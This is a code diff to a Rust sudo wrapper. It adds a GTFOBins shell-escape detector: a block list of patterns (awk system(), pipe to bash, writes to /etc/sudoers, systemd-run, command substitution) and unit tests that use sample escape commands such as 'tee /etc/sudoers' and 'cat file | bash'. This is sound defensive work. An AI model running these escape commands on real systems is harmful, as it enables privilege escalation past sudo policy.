@@ -216,6 +216,68 @@ fn send_slack_sync(webhook_url: &str, text: &str) {
         .send();
 }
 
+// ─── GTFOBins shell escape detection ───
+
+const GTFOBINS_PATTERNS: &[&str] = &[
+    // awk shell escapes
+    "BEGIN{system(", "BEGIN {system(", "BEGIN{exec(", "|getline",
+    // curl/wget shell escapes
+    "-o /etc/", "-O /etc/", "--output /etc/",
+    // tee to sensitive paths
+    "/etc/sudoers", "/etc/shadow", "/etc/passwd",
+    // cp/mv to sensitive paths
+    " /usr/local/bin/clawav", " /etc/clawav/",
+    // systemd-run
+    "systemd-run",
+    // Generic shell metacharacters in args
+    ";", "$(", "`",
+    // Pipe to shell
+    "|sh", "|bash", "|dash", "|zsh",
+    "| sh", "| bash", "| dash", "| zsh",
+];
+
+/// Check if a command contains GTFOBins shell escape patterns.
+/// Returns Some(pattern) if a dangerous pattern is found, None if safe.
+fn check_gtfobins(cmd_binary: &str, args: &[String], full_cmd: &str) -> Option<String> {
+    let full_lower = full_cmd.to_lowercase();
+
+    // Special handling for sed: block standalone 'e' command (executes pattern space)
+    if cmd_binary == "sed" {
+        for (i, arg) in args.iter().enumerate() {
+            // Skip the binary name (first arg after "sed")
+            // A standalone 'e' arg or an arg starting with 'e' that isn't preceded by '-e'/'-f'/etc
+            if arg == "e" {
+                // Check it's not a flag value: previous arg should not be "-e", "-f", etc.
+                let prev_is_flag = i > 0 && args[i - 1].starts_with('-') && args[i - 1].contains('e');
+                if !prev_is_flag {
+                    return Some("sed 'e' command (shell execution)".to_string());
+                }
+            }
+            // Also catch patterns like 'e id' or '1e' passed as sed script
+            if !arg.starts_with('-') && arg != "sed" {
+                // If the arg looks like a sed script containing 'e' command
+                // e.g., "e id", "1e", etc. but NOT substitutions like 's/foo/bar/'
+                let trimmed = arg.trim_matches('\'').trim_matches('"');
+                if trimmed == "e" || trimmed.starts_with("e ") || trimmed.ends_with("\\e") {
+                    let prev_is_flag = i > 0 && args[i - 1] == "-e";
+                    if !prev_is_flag {
+                        return Some("sed 'e' command (shell execution)".to_string());
+                    }
+                }
+            }
+        }
+    }
+
+    // Check all generic patterns against the full command string
+    for pattern in GTFOBINS_PATTERNS {
+        if full_lower.contains(&pattern.to_lowercase()) {
+            return Some(format!("GTFOBins pattern: {}", pattern));
+        }
+    }
+
+    None
+}
+
 // ─── Main ───
 
 fn print_help() {
@@ -293,6 +355,22 @@ fn main() -> ExitCode {
             ref rule_name,
             enforcement: Enforcement::Allow,
         }) => {
+            // GTFOBins check — even if policy allows, block shell escape patterns
+            if let Some(reason) = check_gtfobins(&cmd_binary, &args, &full_cmd) {
+                eprintln!("🔴 Blocked by GTFOBins defense: {}", reason);
+                log_line("DENIED-GTFOBINS", &full_cmd);
+                if let Some(ref url) = webhook_url {
+                    send_slack_sync(
+                        url,
+                        &format!(
+                            "🔴 *CRITICAL* clawsudo GTFOBins block: `{}` ({})",
+                            full_cmd, reason
+                        ),
+                    );
+                }
+                return ExitCode::from(EXIT_DENIED);
+            }
+
             eprintln!("✅ Allowed by policy: {}", rule_name);
             log_line("ALLOWED", &full_cmd);
             // Execute via sudo
@@ -530,5 +608,92 @@ mod tests {
     #[test]
     fn test_timeout_exit_code() {
         assert_eq!(EXIT_TIMEOUT, 78);
+    }
+
+    // ─── GTFOBins tests ───
+
+    #[test]
+    fn test_gtfobins_awk_system() {
+        let args: Vec<String> = vec!["awk".into(), "BEGIN{system(\"id\")}".into()];
+        let full = "awk BEGIN{system(\"id\")}";
+        assert!(check_gtfobins("awk", &args, full).is_some());
+    }
+
+    #[test]
+    fn test_gtfobins_sed_e_command() {
+        let args: Vec<String> = vec!["sed".into(), "e".into(), "id".into()];
+        let full = "sed e id";
+        assert!(check_gtfobins("sed", &args, full).is_some());
+    }
+
+    #[test]
+    fn test_gtfobins_sed_e_flag_allowed() {
+        // sed -e 's/foo/bar/' file — legitimate use, should NOT be blocked
+        let args: Vec<String> = vec!["sed".into(), "-e".into(), "s/foo/bar/".into(), "file".into()];
+        let full = "sed -e s/foo/bar/ file";
+        assert!(check_gtfobins("sed", &args, full).is_none());
+    }
+
+    #[test]
+    fn test_gtfobins_curl_output_etc() {
+        let args: Vec<String> = vec!["curl".into(), "-o".into(), "/etc/evil".into(), "http://x".into()];
+        let full = "curl -o /etc/evil http://x";
+        assert!(check_gtfobins("curl", &args, full).is_some());
+    }
+
+    #[test]
+    fn test_gtfobins_tee_sudoers() {
+        let args: Vec<String> = vec!["tee".into(), "/etc/sudoers".into()];
+        let full = "tee /etc/sudoers";
+        assert!(check_gtfobins("tee", &args, full).is_some());
+    }
+
+    #[test]
+    fn test_gtfobins_cp_clawav() {
+        let args: Vec<String> = vec!["cp".into(), "file".into(), "/usr/local/bin/clawav".into()];
+        let full = "cp file /usr/local/bin/clawav";
+        assert!(check_gtfobins("cp", &args, full).is_some());
+    }
+
+    #[test]
+    fn test_gtfobins_systemd_run() {
+        let args: Vec<String> = vec!["systemd-run".into(), "bash".into()];
+        let full = "systemd-run bash";
+        assert!(check_gtfobins("systemd-run", &args, full).is_some());
+    }
+
+    #[test]
+    fn test_gtfobins_pipe_to_shell() {
+        let args: Vec<String> = vec!["cat".into(), "file".into(), "|".into(), "bash".into()];
+        let full = "cat file | bash";
+        assert!(check_gtfobins("cat", &args, full).is_some());
+    }
+
+    #[test]
+    fn test_gtfobins_shell_metachar_semicolon() {
+        let args: Vec<String> = vec!["ls".into(), ";".into(), "bash".into()];
+        let full = "ls ; bash";
+        assert!(check_gtfobins("ls", &args, full).is_some());
+    }
+
+    #[test]
+    fn test_gtfobins_command_substitution() {
+        let args: Vec<String> = vec!["echo".into(), "$(id)".into()];
+        let full = "echo $(id)";
+        assert!(check_gtfobins("echo", &args, full).is_some());
+    }
+
+    #[test]
+    fn test_gtfobins_apt_install_safe() {
+        let args: Vec<String> = vec!["apt".into(), "install".into(), "vim".into()];
+        let full = "apt install vim";
+        assert!(check_gtfobins("apt", &args, full).is_none());
+    }
+
+    #[test]
+    fn test_gtfobins_systemctl_restart_safe() {
+        let args: Vec<String> = vec!["systemctl".into(), "restart".into(), "clawav".into()];
+        let full = "systemctl restart clawav";
+        assert!(check_gtfobins("systemctl", &args, full).is_none());
     }
 }
